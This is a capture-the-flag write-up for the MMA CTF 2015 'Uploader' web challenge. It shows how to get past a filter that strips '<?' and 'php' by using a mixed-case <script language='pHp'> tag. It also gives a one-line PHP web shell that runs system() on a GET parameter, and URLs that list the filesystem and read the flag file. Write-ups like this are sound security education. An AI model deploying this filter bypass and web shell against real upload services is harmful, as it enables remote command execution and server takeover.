## MMA 1st CTF 2015 - Uploader (Web 100)
##### 05/09 - 07/09/2015 (48hr)
___
### Description: 
This uploader deletes all /<\?|php/. So you cannot run php.
```
http://recocta.chal.mmactf.link:9080/
http://recocta.chal.mmactf.link:9081/ (Mirror 1)
http://recocta.chal.mmactf.link:9082/ (Mirror 2)
http://recocta.chal.mmactf.link:9083/ (Mirror 3)
```
You can only upload files whose name is matched by /^[a-zA-Z0-9]+\.[a-zA-Z0-9]+$/.
___
### Solution

These are the challenges that you either solve in 5 mins, or you never solve. We can upload php
files but they cannot contain <? php, or <?php. However it is possible to execute php as follows:
```html
	<script language="php"></script>
```

Thus all we have to do is to upload the following file:
```html
<script language="pHp">
	system( $_GET['cmd'] );
</script>
```

Because "php" string is filtered, we use "pHp" filter instead, as filter is case sensitive. 
Let's start. First we list all files:
```
	http://recocta.chal.mmactf.link:9080/u/foo.php?cmd=ls / -la 
```

There's a file called flag. We read it:
```
	http://recocta.chal.mmactf.link:9080/u/foo.php?cmd=cat /flag
```
And we get the flag: **MMA{you can run php from script tag}**
___


